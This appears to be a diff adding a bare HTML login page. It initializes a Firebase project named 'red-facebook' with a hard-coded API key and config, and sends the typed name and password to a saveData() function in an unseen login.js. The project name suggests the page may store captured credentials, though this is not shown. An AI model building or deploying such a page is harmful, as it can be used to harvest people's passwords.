@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+    
+<script src="https://www.gstatic.com/firebasejs/4.13.0/firebase.js"></script>
+<script>
+  // Initialize Firebase
+  var config = {
+    apiKey: "AIzaSyALrGdPATl-8RuVIOQKkdcPXrXTWSxBFro",
+    authDomain: "red-facebook.firebaseapp.com",
+    databaseURL: "https://red-facebook.firebaseio.com",
+    projectId: "red-facebook",
+    storageBucket: "red-facebook.appspot.com",
+    messagingSenderId: "967702840103"
+  };
+  firebase.initializeApp(config);
+</script>
+</head>
+<body>
+        <input type="text" id="name">
+        <input type="password" id="password">
+        <button id="submit" onclick="saveData()">Submit</button>
+</body>
+    <script src="login.js"></script>
+</html>
